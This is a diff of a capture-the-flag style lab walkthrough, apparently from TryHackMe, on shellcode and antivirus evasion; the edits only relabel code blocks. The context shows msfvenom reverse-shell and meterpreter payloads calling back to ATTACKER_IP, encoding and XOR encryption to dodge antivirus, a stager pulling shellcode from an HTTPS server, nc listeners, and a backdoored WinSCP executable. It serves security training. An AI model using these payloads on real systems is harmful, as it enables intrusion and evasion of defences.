@@ -285,7 +285,7 @@ Next, the program starts the GOBACK routine and prepares the required registers 
  
 
     Assembler and link our code 
-```Assembler and link our code 
+```bash
 user@AttackBox$ nasm -f elf64 thm.asm
 user@AttackBox$ ld thm.o -o thm
 user@AttackBox$ ./thm
@@ -301,7 +301,7 @@ Now that we have the compiled ASM program, let's extract the shellcode with the 
  
 
     Dump the .text section 
-```Dump the .text section 
+```bash
 user@AttackBox$ objdump -d thm
 
 thm:     file format elf64-x86-64
@@ -341,7 +341,7 @@ Disassembly of section .text:
  
 
    Extract the .text section 
-```Extract the .text section 
+```bash
 user@AttackBox$ objcopy -j .text -O binary thm thm.text
 ```
 
@@ -350,7 +350,7 @@ user@AttackBox$ objcopy -j .text -O binary thm thm.text
  The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The `xxd` command has the `-i` option that will output the binary file in a C string directly:
 
    Output the hex equivalent to our shellcode 
-```Output the hex equivalent to our shellcode 
+```bash
 user@AttackBox$ xxd -i thm.text
 unsigned char new_text[] = {
   0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
@@ -391,7 +391,7 @@ int main(int argc, char **argv) {
  Then, we compile and execute it as follows,
 
     Compiler our C program 
-```Compiler our C program 
+```bash
 user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
 user@AttackBox$ ./thmx
 THM,Rocks!
@@ -438,7 +438,7 @@ Generate shellcode using Public Tools
  
 
     Generate Shellcode to Execute calc.exe 
-```Generate Shellcode to Execute calc.exe 
+```bash
 user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
 No encoder specified, outputting raw payload
 Payload size: 193 bytes
@@ -506,7 +506,7 @@ int main()
  
 
     Compile our C program for Windows 
-```Compile our C program for Windows 
+```bash
 user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
 ```
 
@@ -515,7 +515,7 @@ user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
  Once we have our exe file, let's transfer it to the Windows machine and execute it. To transfer the file you can use smbclient from your AttackBox to access the SMB share at \\MACHINE_IP\Tools with the following commands (remember the password for the `thm` user is `Password321`):
 
     Copy calc-MSC.exe to Windows Machine 
-```Copy calc-MSC.exe to Windows Machine 
+```bash
 user@AttackBox$ smbclient -U thm '//MACHINE_IP/Tools'
 smb: \> put calc-MSF.exe
 ```
@@ -541,7 +541,7 @@ C2 Frameworks provide shellcode as a raw binary file `.bin`. If this is the case
  
 
     Generate a Raw shellcode to Execute calc.exe 
-```Generate a Raw shellcode to Execute calc.exe 
+```bash
 user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
 No encoder specified, outputting raw payload
 Payload size: 193 bytes
@@ -557,7 +557,7 @@ user@AttackBox$ file /tmp/example.bin
  
 
     Get the shellcode using the xxd command 
-```Get the shellcode using the xxd command 
+```bash
 user@AttackBox$ xxd -i /tmp/example.bin
 unsigned char _tmp_example_bin[] = {
   0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
@@ -773,7 +773,7 @@ WaitForSingleObject(threadHandle, 0xFFFFFFFF);
  To compile the code, we suggest copying it into a Windows machine as a file called staged-payload.cs and compiling it with the following command:
 
     PowerShell  
-```PowerShell 
+```bash
 PS C:\> csc staged-payload.cs
 ```
 
@@ -782,7 +782,7 @@ PS C:\> csc staged-payload.cs
  Once our payload is compiled, we will need to set up a web server to host the final shellcode. Remember that our stager will connect to this server to retrieve the shellcode and execute it in the victim machine in-memory. Let's start by generating a shellcode (the name of the file needs to match the URL in our stager):
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
 ```
 
@@ -791,21 +791,21 @@ user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPOR
  Now that we have a shellcode, let's set up a simple HTTPS server. First, we will need to create a self-signed certificate with the following command:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
 ```
 
    You will be asked for some information, but feel free to press enter for any requested information, as we don't need the SSL certificate to be valid. Once we have an SSL certificate, we can spawn a simple HTTPS server using python3 with the following command:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
 ```
 
    With all of this ready, we can now execute our stager payload. The stager should connect to the HTTPS server and retrieve the shellcode.bin file to load it into memory and run it on the victim machine. Remember to set up an nc listener to receive the reverse shell on the same port specified when running msfvenom:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 7474
 ```
 
@@ -902,7 +902,7 @@ Encode using MSFVenom
 Let's generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to msfvenom with the following command:
 
     Listing Encoders within the Metasploit Framework 
-```Listing Encoders within the Metasploit Framework 
+```bash
 user@AttackBox$ msfvenom --list encoders | grep excellent
     cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
     x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
@@ -913,7 +913,7 @@ user@AttackBox$ msfvenom --list encoders | grep excellent
  
 
    Encoding using the Metasploit Framework (Shikata_ga_nai) 
-```Encoding using the Metasploit Framework (Shikata_ga_nai) 
+```bash
 user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
 Found 1 compatible encoders
 Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
@@ -938,7 +938,7 @@ Encryption using MSFVenom
  You can easily generate encrypted payloads using msfvenom. The choices for encryption algorithms are, however, a bit scarce. To list the available encryption algorithms, you can use the following command:
 
     Listing encryption modules within the Metasploit Framework 
-```Listing encryption modules within the Metasploit Framework 
+```bash
 user@AttackBox$ msfvenom --list encrypt
 Framework Encryption Formats [--encrypt <value>]
 ================================================
@@ -954,7 +954,7 @@ Framework Encryption Formats [--encrypt <value>]
    Let's build an XOR encrypted payload. For this type of algorithm, you will need to specify a key. The command would look as follows:
 
     Xoring Shellcode using the Metasploit Framework 
-```Xoring Shellcode using the Metasploit Framework 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -975,7 +975,7 @@ Saved as: xored-revshell.exe
  
 
    Generate a CSharp shellcode Format 
-```Generate a CSharp shellcode Format 
+```bash
 user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
 ```
 
@@ -1032,7 +1032,7 @@ namespace Encrypter
  To compile and execute the encoder, we can use the following commands on the Windows machine:
 
     Compiling and running our custom CSharp encoder 
-```Compiling and running our custom CSharp encoder 
+```bash
 C:\> csc.exe Encrypter.cs
 C:\> .\Encrypter.exe
 qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
@@ -1106,7 +1106,7 @@ public class Program {
 Let's compile our payload with the following command on the Windows machine:
 
     Compile Our Encrypted Payload 
-```Compile Our Encrypted Payload 
+```bash
 C:\> csc.exe EncStageless.cs
 ```
 
@@ -1115,7 +1115,7 @@ C:\> csc.exe EncStageless.cs
  
 
    Set Up nc Listener 
-```Set Up nc Listener 
+```bash
 user@AttackBox$ nc -lvp 443
 Listening on [0.0.0.0] (family 0, port 443)
 Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
@@ -1228,14 +1228,14 @@ public class Program {
    This payload takes a shellcode generated by msfvenom and runs it into a separate thread. For this to work, you'll need to generate a new shellcode and put it into the `shellcode` variable of the code:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
 ```
 
    You can then compile your payload in the Windows machine using the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> csc UnEncStagelessPayload.cs
 ```
 
@@ -1262,7 +1262,7 @@ C:\> csc UnEncStagelessPayload.cs
  The new payload should be ready and hopefully won't trigger any alarms when uploaded to the THM Antivirus Checker! (shortcut available on your desktop). In fact, if you execute your payload and set up an `nc` listener, you should be able to get a shell back:
 
     AttackBox  
-```AttackBox 
+```bash
 user@attackbox$ nc -lvp 7478
 ```
 
@@ -1329,7 +1329,7 @@ For this task, we will be backdooring the WinSCP executable available at `C:\Too
 **Note:**  Metasploit is installed in the Windows machine for your convenience, but it might take up to three minutes to generate the payload (the produced warnings can be safely ignored).
 
     AttackBox  
-```AttackBox 
+```bash
 C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
 ```
 
@@ -1340,7 +1340,7 @@ C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lp
 ![Image 22](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c3bd06d935a937b2af7dace6a41a27.png)
 
   ➜     AttackBox  
-```AttackBox 
+```bash
 user@attackbox$ nc -lvp 7779      
 Listening on 0.0.0.0 7779
 Connection received on 10.10.183.127 49813
